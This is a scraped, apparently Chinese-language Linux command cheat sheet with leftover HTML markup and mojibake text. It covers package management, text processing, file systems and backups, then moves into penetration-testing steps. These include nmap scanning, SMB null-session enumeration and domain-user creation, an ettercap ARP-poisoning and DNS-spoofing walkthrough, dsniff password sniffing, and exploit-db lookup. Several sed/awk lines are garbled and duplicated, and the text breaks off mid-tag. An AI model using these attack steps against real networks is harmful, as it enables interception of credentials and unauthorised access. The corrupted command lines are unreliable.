æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„ deb åŒ… dpkg -l <span class="token operator">|</span> <span class="token function">grep</span> httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« <span class="token string">"httpd"</span> å­—æ ·çš„debåŒ… dpkg -s package_name è·å¾—å·²ç»å®‰è£…åœ¨ç³»ç»Ÿä¸­ä¸€ä¸ªç‰¹æ®ŠåŒ…çš„ä¿¡æ¯ dpkg -L package_name æ˜¾ç¤ºç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„ä¸€ä¸ªdebåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨ dpkg --contents package.deb æ˜¾ç¤ºå°šæœªå®‰è£…çš„ä¸€ä¸ªåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨ dpkg -S /bin/ping ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªdebåŒ…æä¾›APT è½¯ä»¶å·¥å…· <span class="token punctuation">(</span>Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ<span class="token punctuation">)</span> <span class="token function">apt-get</span> <span class="token function">install</span> package_name å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… apt-cdrom <span class="token function">install</span> package_name ä»å…‰ç›˜å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… <span class="token function">apt-get</span> update å‡çº§åˆ—è¡¨ä¸­çš„è½¯ä»¶åŒ… <span class="token function">apt-get</span> upgrade å‡çº§æ‰€æœ‰å·²å®‰è£…çš„è½¯ä»¶ <span class="token function">apt-get</span> remove package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ªdebåŒ… <span class="token function">apt-get</span> check ç¡®è®¤ä¾èµ–çš„è½¯ä»¶ä»“åº“æ­£ç¡® <span class="token function">apt-get</span> clean ä»ä¸‹è½½çš„è½¯ä»¶åŒ…ä¸­æ¸…ç†ç¼“å­˜ apt-cache search searched-package è¿”å›åŒ…å«æ‰€è¦æœç´¢å­—ç¬¦ä¸²çš„è½¯ä»¶åŒ…åç§°è¿”å›é¡¶éƒ¨ç´¢å¼• ^æŸ¥çœ‹æ–‡ä»¶å†…å®¹ <span class="token function">cat</span> file1 ä»ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹æ­£å‘æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ tac file1 ä»æœ€åä¸€è¡Œå¼€å§‹åå‘æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ <span class="token function">more</span> file1 æŸ¥çœ‹ä¸€ä¸ªé•¿æ–‡ä»¶çš„å†…å®¹ <span class="token function">less</span> file1 ç±»ä¼¼äº <span class="token string">'more'</span> å‘½ä»¤ï¼Œä½†æ˜¯å®ƒå…è®¸åœ¨æ–‡ä»¶ä¸­å’Œæ­£å‘æ“ä½œä¸€æ ·çš„åå‘æ“ä½œ <span class="token function">head</span> -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å‰ä¸¤è¡Œ <span class="token function">tail</span> -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„æœ€åä¸¤è¡Œ <span class="token function">tail</span> -f /var/log/messages å®æ—¶æŸ¥çœ‹è¢«æ·»åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹</code></pre><h2 id="æ–‡æœ¬å¤„ç†"><a href="#æ–‡æœ¬å¤„ç†" class="headerlink" title="æ–‡æœ¬å¤„ç†"></a>æ–‡æœ¬å¤„ç†</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> file1 file2 <span class="token punctuation">..</span>. <span class="token operator">|</span> <span class="token function">command</span> <span class="token operator">&lt;</span><span class="token operator">></span> file1_in.txt_or_file1_out.txt general syntax <span class="token keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">></span> result.txt åˆå¹¶ä¸€ä¸ªæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜æ–‡æœ¬ï¼Œå¹¶å°†ç®€ä»‹å†™å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­ <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">>></span> result.txt åˆå¹¶ä¸€ä¸ªæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜æ–‡æœ¬ï¼Œå¹¶å°†ç®€ä»‹å†™å…¥ä¸€ä¸ªå·²æœ‰çš„æ–‡ä»¶ä¸­ <span class="token function">grep</span> Aug /var/log/messages åœ¨æ–‡ä»¶ <span class="token string">'/var/log/messages'</span>ä¸­æŸ¥æ‰¾å…³é”®è¯<span class="token string">"Aug"</span> <span class="token function">grep</span> ^Aug /var/log/messages åœ¨æ–‡ä»¶ <span class="token string">'/var/log/messages'</span>ä¸­æŸ¥æ‰¾ä»¥<span class="token string">"Aug"</span>å¼€å§‹çš„è¯æ±‡ <span class="token function">grep</span> <span class="token punctuation">[</span>0-9<span class="token punctuation">]</span> /var/log/messages é€‰æ‹© <span class="token string">'/var/log/messages'</span> æ–‡ä»¶ä¸­æ‰€æœ‰åŒ…å«æ•°å­—çš„è¡Œ <span class="token function">grep</span> Aug -R /var/log/* åœ¨ç›®å½• <span class="token string">'/var/log'</span> åŠéšåçš„ç›®å½•ä¸­æœç´¢å­—ç¬¦ä¸²<span class="token string">"Aug"</span> <span class="token function">sed</span> <span class="token string">'s/stringa1/stringa2/g'</span> example.txt å°†example.txtæ–‡ä»¶ä¸­çš„ <span class="token string">"string1"</span> æ›¿æ¢æˆ <span class="token string">"string2"</span> <span class="token function">sed</span> <span class="token string">'/^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰ç©ºç™½è¡Œ  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰ç©ºç™½è¡Œ  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰æ³¨é‡Šå’Œç©ºç™½è¡Œ <span class="token keyword">echo</span> <span class="token string">'esempio'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span> åˆå¹¶ä¸Šä¸‹å•å…ƒæ ¼å†…å®¹ <span class="token function">sed</span> -e <span class="token string">'1d'</span> result.txt ä»æ–‡ä»¶example.txt ä¸­æ’é™¤ç¬¬ä¸€è¡Œ <span class="token function">sed</span> -n <span class="token string">'/stringa1/p'</span> æŸ¥çœ‹åªåŒ…å«è¯æ±‡ <span class="token string">"string1"</span>çš„è¡Œ <span class="token function">sed</span> -e <span class="token string">'s/ *//â€²example.txtåˆ é™¤æ¯ä¸€è¡Œæœ€åçš„ç©ºç™½å­—ç¬¦sedâˆ’eâ€²s/stringa1//gâ€²example.txtä»æ–‡æ¡£ä¸­åªåˆ é™¤è¯æ±‡"string1"å¹¶ä¿ç•™å‰©ä½™å…¨éƒ¨sedâˆ’nâ€²1,5p;5qâ€²example.txtæŸ¥çœ‹ä»ç¬¬ä¸€è¡Œåˆ°ç¬¬5è¡Œå†…å®¹sedâˆ’nâ€²5p;5qâ€²example.txtæŸ¥çœ‹ç¬¬5è¡Œsedâˆ’eâ€²s/00âˆ—/0/gâ€²example.txtç”¨å•ä¸ªé›¶æ›¿æ¢å¤šä¸ªé›¶catâˆ’nfile1æ ‡ç¤ºæ–‡ä»¶çš„è¡Œæ•°catexample.txt|awkâ€²NR//â€²example.txtåˆ é™¤æ¯ä¸€è¡Œæœ€åçš„ç©ºç™½å­—ç¬¦sedâˆ’eâ€²s/stringa1//gâ€²example.txtä»æ–‡æ¡£ä¸­åªåˆ é™¤è¯æ±‡"string1"å¹¶ä¿ç•™å‰©ä½™å…¨éƒ¨sedâˆ’nâ€²1,5p;5qâ€²example.txtæŸ¥çœ‹ä»ç¬¬ä¸€è¡Œåˆ°ç¬¬5è¡Œå†…å®¹sedâˆ’nâ€²5p;5qâ€²example.txtæŸ¥çœ‹ç¬¬5è¡Œsedâˆ’eâ€²s/00âˆ—/0/gâ€²example.txtç”¨å•ä¸ªé›¶æ›¿æ¢å¤šä¸ªé›¶catâˆ’nfile1æ ‡ç¤ºæ–‡ä»¶çš„è¡Œæ•°catexample.txt|awkâ€²NR1}'</span> æŸ¥çœ‹ä¸€è¡Œç¬¬ä¸€æ  <span class="token keyword">echo</span> a b c <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print 1,1,3}'</span> æŸ¥çœ‹ä¸€è¡Œçš„ç¬¬ä¸€å’Œç¬¬ä¸‰æ  <span class="token function">paste</span> file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ <span class="token function">paste</span> -d <span class="token string">'+'</span> file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ï¼Œä¸­é—´ç”¨<span class="token string">"+"</span>åŒºåˆ† <span class="token function">sort</span> file1 file2 æ’åºä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹ <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„å¹¶é›†<span class="token punctuation">(</span>é‡å¤çš„è¡Œåªä¿ç•™ä¸€ä»½<span class="token punctuation">)</span> <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -u åˆ é™¤äº¤é›†ï¼Œç•™ä¸‹å…¶ä»–çš„è¡Œ <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -d å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„äº¤é›†<span class="token punctuation">(</span>åªç•™ä¸‹åŒæ—¶å­˜åœ¨äºä¸¤ä¸ªæ–‡ä»¶ä¸­çš„æ–‡ä»¶<span class="token punctuation">)</span> <span class="token function">comm</span> -1 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ <span class="token string">'file1'</span> æ‰€åŒ…å«çš„å†…å®¹ <span class="token function">comm</span> -2 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ <span class="token string">'file2'</span> æ‰€åŒ…å«çš„å†…å®¹ <span class="token function">comm</span> -3 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ä¸¤ä¸ªæ–‡ä»¶å…±æœ‰çš„éƒ¨åˆ†</code></pre><h2 id="å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢"><a href="#å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢" class="headerlink" title="å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢"></a>å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢</h2><pre class=" language-bash"><code class="language-bash">dos2unix filedos.txt fileunix.txt å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„æ ¼å¼ä»MSDOSè½¬æ¢æˆUNIX unix2dos fileunix.txt filedos.txt å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„æ ¼å¼ä»UNIXè½¬æ¢æˆMSDOS recode <span class="token punctuation">..</span>HTML <span class="token operator">&lt;</span> page.txt <span class="token operator">></span> page.html å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶è½¬æ¢æˆhtml recode -l <span class="token operator">|</span> <span class="token function">more</span> æ˜¾ç¤ºæ‰€æœ‰å…è®¸çš„è½¬æ¢æ ¼å¼</code></pre><h2 id="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"><a href="#æ–‡ä»¶ç³»ç»Ÿåˆ†æ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"></a>æ–‡ä»¶ç³»ç»Ÿåˆ†æ</h2><pre class=" language-bash"><code class="language-bash">badblocks -v /dev/hda1 æ£€æŸ¥ç£ç›˜hda1ä¸Šçš„åç£å— <span class="token function">fsck</span> /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šlinuxæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.ext2 /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ e2fsck /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ e2fsck -j /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.ext3 /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.vfat /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šfatæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.msdos /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ dosfsck /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§</code></pre><h2 id="åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"><a href="#åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"></a>åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</h2><pre class=" language-bash"><code class="language-bash"> mkfs /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ mke2fs /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext2çš„æ–‡ä»¶ç³»ç»Ÿ mke2fs -j /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext3<span class="token punctuation">(</span>æ—¥å¿—å‹<span class="token punctuation">)</span>çš„æ–‡ä»¶ç³»ç»Ÿ mkfs -t vfat 32 -F /dev/hda1 åˆ›å»ºä¸€ä¸ª FAT32 æ–‡ä»¶ç³»ç»Ÿ <span class="token function">fdformat</span> -n /dev/fd0 æ ¼å¼åŒ–ä¸€ä¸ªè½¯ç›˜ mkswap /dev/hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»ŸSWAPæ–‡ä»¶ç³»ç»Ÿ mkswap /dev/hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»Ÿ swapon /dev/hda3 å¯ç”¨ä¸€ä¸ªæ–°çš„swapæ–‡ä»¶ç³»ç»Ÿ swapon /dev/hda2 /dev/hdb3 å¯ç”¨ä¸¤ä¸ªswapåˆ†åŒº</code></pre><h2 id="å¤‡ä»½"><a href="#å¤‡ä»½" class="headerlink" title="å¤‡ä»½"></a>å¤‡ä»½</h2><pre class=" language-bash"><code class="language-bash">dump -0aj -f /tmp/home0.bak /home åˆ¶ä½œä¸€ä¸ª <span class="token string">'/home'</span> ç›®å½•çš„å®Œæ•´å¤‡ä»½ dump -1aj -f /tmp/home0.bak /home åˆ¶ä½œä¸€ä¸ª <span class="token string">'/home'</span> ç›®å½•çš„äº¤äº’å¼å¤‡ä»½ restore -if /tmp/home0.bak è¿˜åŸä¸€ä¸ªäº¤äº’å¼å¤‡ä»½ <span class="token function">rsync</span> -rogpav --delete /home /tmp åŒæ­¥ä¸¤è¾¹çš„ç›®å½• <span class="token function">rsync</span> -rogpav -e <span class="token function">ssh</span> --delete /home ip_address:/tmp é€šè¿‡SSHé€šé“rsync <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete ip_addr:/home/public /home/local é€šè¿‡sshå’Œå‹ç¼©å°†ä¸€ä¸ªè¿œç¨‹ç›®å½•åŒæ­¥åˆ°æœ¬åœ°ç›®å½• <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete /home/local ip_addr:/home/public é€šè¿‡sshå’Œå‹ç¼©å°†æœ¬åœ°ç›®å½•åŒæ­¥åˆ°è¿œç¨‹ç›®å½• <span class="token function">dd</span> bs<span class="token operator">=</span>1M if<span class="token operator">=</span>/dev/hda <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">|</span> <span class="token function">ssh</span> user@ip_addr <span class="token string">'dd of=hda.gz'</span> é€šè¿‡sshåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä¸€æ¬¡å¤‡ä»½æœ¬åœ°ç£ç›˜çš„æ“ä½œ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/sda of<span class="token operator">=</span>/tmp/file1 å¤‡ä»½ç£ç›˜å†…å®¹åˆ°ä¸€ä¸ªæ–‡ä»¶ <span class="token function">tar</span> -Puf backup.tar /home/user æ‰§è¡Œä¸€æ¬¡å¯¹ <span class="token string">'/home/user'</span> ç›®å½•çš„äº¤äº’å¼å¤‡ä»½æ“ä½œ <span class="token punctuation">(</span> <span class="token function">cd</span> /tmp/local/ <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> c <span class="token keyword">.</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/share/ &amp;&amp; tar x -p'</span> é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªç›®å½•å†…å®¹ <span class="token punctuation">(</span> <span class="token function">tar</span> c /home <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/backup-home &amp;&amp; tar x -p'</span> é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªæœ¬åœ°ç›®å½• <span class="token function">tar</span> cf - <span class="token keyword">.</span> <span class="token operator">|</span> <span class="token punctuation">(</span>cd /tmp/backup <span class="token punctuation">;</span> <span class="token function">tar</span> xf - <span class="token punctuation">)</span> æœ¬åœ°å°†ä¸€ä¸ªç›®å½•å¤åˆ¶åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œä¿ç•™åŸæœ‰æƒé™åŠé“¾æ¥ <span class="token function">find</span> /home/user1 -name <span class="token string">'*.txt'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">cp</span> -av --target-directory<span class="token operator">=</span>/home/backup/ --parents ä»ä¸€ä¸ªç›®å½•æŸ¥æ‰¾å¹¶å¤åˆ¶æ‰€æœ‰ä»¥ <span class="token string">'.txt'</span> ç»“å°¾çš„æ–‡ä»¶åˆ°å¦ä¸€ä¸ªç›®å½• <span class="token function">find</span> /var/log -name <span class="token string">'*.log'</span> <span class="token operator">|</span> <span class="token function">tar</span> cv --files-from<span class="token operator">=</span>- <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token operator">></span> log.tar.bz2 æŸ¥æ‰¾æ‰€æœ‰ä»¥ <span class="token string">'.log'</span> ç»“å°¾çš„æ–‡ä»¶å¹¶åšæˆä¸€ä¸ªbzipåŒ… <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hda of<span class="token operator">=</span>/dev/fd0 bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 åšä¸€ä¸ªå°† MBR <span class="token punctuation">(</span>Master Boot Record<span class="token punctuation">)</span>å†…å®¹å¤åˆ¶åˆ°è½¯ç›˜çš„åŠ¨ä½œ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/fd0 of<span class="token operator">=</span>/dev/hda bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 ä»å·²ç»ä¿å­˜åˆ°è½¯ç›˜çš„å¤‡ä»½ä¸­æ¢å¤MBRå†…å®¹</code></pre><h2 id="å…‰ç›˜"><a href="#å…‰ç›˜" class="headerlink" title="å…‰ç›˜"></a>å…‰ç›˜</h2><pre class=" language-bash"><code class="language-bash">cdrecord -v gracetime<span class="token operator">=</span>2 dev<span class="token operator">=</span>/dev/cdrom -eject blank<span class="token operator">=</span>fast -force æ¸…ç©ºä¸€ä¸ªå¯å¤å†™çš„å…‰ç›˜å†…å®¹ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">></span> cd.iso åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå…‰ç›˜çš„isoé•œåƒæ–‡ä»¶ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">></span> cd_iso.gz åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå‹ç¼©äº†çš„å…‰ç›˜isoé•œåƒæ–‡ä»¶ <span class="token function">mkisofs</span> -J -allow-leading-dots -R -V <span class="token string">"Label CD"</span> -iso-level 4 -o ./cd.iso data_cd åˆ›å»ºä¸€ä¸ªç›®å½•çš„isoé•œåƒæ–‡ä»¶ cdrecord -v dev<span class="token operator">=</span>/dev/cdrom cd.iso åˆ»å½•ä¸€ä¸ªISOé•œåƒæ–‡ä»¶ <span class="token function">gzip</span> -dc cd_iso.gz <span class="token operator">|</span> cdrecord dev<span class="token operator">=</span>/dev/cdrom - åˆ»å½•ä¸€ä¸ªå‹ç¼©äº†çš„ISOé•œåƒæ–‡ä»¶ <span class="token function">mount</span> -o loop cd.iso /mnt/iso æŒ‚è½½ä¸€ä¸ªISOé•œåƒæ–‡ä»¶ cd-paranoia -B ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­ cd-paranoia -- <span class="token string">"-3"</span> ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­ï¼ˆå‚æ•°-3ï¼‰ cdrecord --scanbus æ‰«ææ€»çº¿ä»¥è¯†åˆ«scsié€šé“ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hdc <span class="token operator">|</span> md5sum æ ¡éªŒä¸€ä¸ªè®¾å¤‡çš„md5sumç¼–ç ï¼Œä¾‹å¦‚ä¸€å¼  CD</code></pre><h2 id="åº”ç”¨å‘½ä»¤"><a href="#åº”ç”¨å‘½ä»¤" class="headerlink" title="åº”ç”¨å‘½ä»¤"></a>åº”ç”¨å‘½ä»¤</h2><pre class=" language-bash"><code class="language-bash">whois åŸŸå/ip æŸ¥çœ‹åŸŸåçš„è¯¦ç»†ä¿¡æ¯ã€‚<span class="token function">ping</span> åŸŸå/ip æµ‹è¯•æœ¬æœºåˆ°è¿œç«¯ä¸»æœºæ˜¯å¦è”é€šã€‚<span class="token function">dig</span> åŸŸå/ip æŸ¥çœ‹åŸŸåè§£æçš„è¯¦ç»†ä¿¡æ¯ã€‚host -l åŸŸå dnsæœåŠ¡å™¨ ä¼ è¾“zoneã€‚</code></pre><h2 id="æ‰«ænmap"><a href="#æ‰«ænmap" class="headerlink" title="æ‰«ænmap"></a>æ‰«ænmap</h2><pre class=" language-bash"><code class="language-bash">-sS åŠå¼€æ‰«æTCPå’ŒSYNæ‰«æã€‚-sT å®Œå…¨TCPè¿æ¥æ‰«æã€‚-sU UDPæ‰«æ-PS synåŒ…æ¢æµ‹<span class="token punctuation">(</span>é˜²ç«å¢™æ¢æµ‹<span class="token punctuation">)</span>-PA ackåŒ…æ¢æµ‹<span class="token punctuation">(</span>é˜²ç«å¢™æ¢æµ‹<span class="token punctuation">)</span>-PN ä¸pingã€‚-n ä¸dnsè§£æã€‚-A -Oå’Œ-sVã€‚-O æ“ä½œç³»ç»Ÿè¯†åˆ«ã€‚-sV æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯<span class="token punctuation">(</span>banner<span class="token punctuation">)</span>-p ç«¯å£æ‰«æã€‚-T è®¾ç½®æ—¶é—´çº§åˆ«<span class="token punctuation">(</span>0-5<span class="token punctuation">)</span>-iL å¯¼å…¥æ‰«æç»“æœã€‚-oG è¾“å‡ºæ‰«æç»“æœã€‚æ“ä½œç³»ç»Ÿè¯†åˆ«:p0f -i eth0 -U -p å¼€å¯æ··æ‚æ¨¡å¼ã€‚xprobe2 ip<span class="token operator">|</span>åŸŸå æ£€æµ‹osã€‚bannerè·å–:nc ip port æ£€æµ‹ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚telnet ip port æ£€æµ‹ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚<span class="token function">wget</span> ip ä¸‹è½½ä¸»é¡µã€‚<span class="token function">cat</span> index.html <span class="token operator">|</span> <span class="token function">more</span> æ˜¾ç¤ºä¸»é¡µä»£ç ã€‚q é€€å‡ºã€‚windowsæšä¸¾nmap -sS -p 139,445 ip æ‰«æwindowsã€‚<span class="token function">cd</span> /pentest/enumeration/smb-enumnbtscan -f targetIP æ£€æµ‹netbiosã€‚smbgetserverinfo -i targetIP æ‰«æname,os,ç»„ã€‚smbdumpusers -i targetIP åˆ—å‡ºç”¨æˆ·ã€‚smbclient -L //targetIP åˆ—å‡ºå…±äº«ã€‚ä½¿ç”¨windows:net use \\ipipc$ <span class="token string">""</span> /u:<span class="token string">""</span> å¼€å¯ç©ºä¼šè¯ã€‚net view \\ip æ˜¾ç¤ºå…±äº«ä¿¡æ¯ã€‚smbclient:smbclient -L hostName -I targetIP æšä¸¾å…±äº«ã€‚smbclient -L hostName/share -U <span class="token string">""</span> ç”¨ç©ºç”¨æˆ·è¿æ¥ã€‚smbclient -L hostName -I targetIP -U adminæ™®é€šç”¨æˆ·è¿æ¥ã€‚rpcclient:rpcclient targetIP -U â€œâ€æ‰“å¼€ä¸€ä¸ªç©ºä¼šè¯ã€‚netshareenum æšä¸¾å…±äº«ã€‚enumdomusers æšä¸¾ç”¨æˆ·ã€‚lsaenumsid æšä¸¾åŸŸSIDã€‚queryuser RID æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ã€‚createdomuser åˆ›å»ºç”¨æˆ·è®¿é—®ã€‚</code></pre><h2 id="ARPæ¬ºéª—"><a href="#ARPæ¬ºéª—" class="headerlink" title="ARPæ¬ºéª—"></a>ARPæ¬ºéª—</h2><pre class=" language-bash"><code class="language-bash">ettercap:<span class="token function">nano</span> /usr/local/etc/etter.confé…ç½®æ–‡ä»¶Sniff <span class="token operator">></span> Unified sniffing <span class="token operator">></span> Network interface: eth0 <span class="token operator">></span> OK è®¾ç½®æŠ“åŒ…çš„ç½‘å¡Hosts <span class="token operator">></span> Scan <span class="token keyword">for</span> hosts <span class="token punctuation">(</span>do this two times<span class="token punctuation">)</span>æ‰«æç½‘æ®µçš„ä¸»æœºHosts <span class="token operator">></span> Hosts list æ˜¾ç¤ºä¸»æœºåˆ—è¡¨Select the default gateway <span class="token operator">></span> Add to Target 1 æ·»åŠ ä¸»æœºSelect the target <span class="token operator">></span> Add to Target 2 æ·»åŠ ä¸»æœºMitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK è®¾ç½®ARPæ”»å‡»Start <span class="token operator">></span> Start sniffing å¼€å§‹æ”»å‡»dsniff -i eth0 ç›‘å¬ç½‘å¡çªƒå¬ç™»å½•ç”¨æˆ·å¯†ç urlsnarf -i eth0 å—…æ¢httpè¯·æ±‚msgsnarf -i eth0 å—…æ¢èŠå¤©è½¯ä»¶çš„èŠå¤©å†…å®¹driftnet -i eth0 ç½‘ç»œç®¡ç†å—…æ¢å›¾ç‰‡ï¼ŒéŸ³é¢‘ã€‚dnsæ¬ºéª—:<span class="token function">nano</span> /usr/local/share/ettercap/etter.dnsç¼–è¾‘é…ç½®æ–‡ä»¶Plugins <span class="token operator">></span> Manage the plugins <span class="token operator">></span> dns_spoof è®¾ç½®dnsæ¬ºéª—Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK è®¾ç½®ARPStart <span class="token operator">></span> Start sniffing å¼€å§‹æ”»å‡»</code></pre><h2 id="Exploitsæ¼æ´åˆ©ç”¨"><a href="#Exploitsæ¼æ´åˆ©ç”¨" class="headerlink" title="Exploitsæ¼æ´åˆ©ç”¨"></a>Exploitsæ¼æ´åˆ©ç”¨</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /pentest/exploits/exploit-db è¿›å…¥ç›®å½•<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i <span class="token punctuation">[</span>exploit<span class="token punctuation">]</span> æŸ¥è¯¢éœ€è¦çš„æ¼æ´<span class="token function">cat</span> exploit <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"#include"</span>æ£€æŸ¥è¿è¡Œç¯å¢ƒ<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i exploit <span class="token 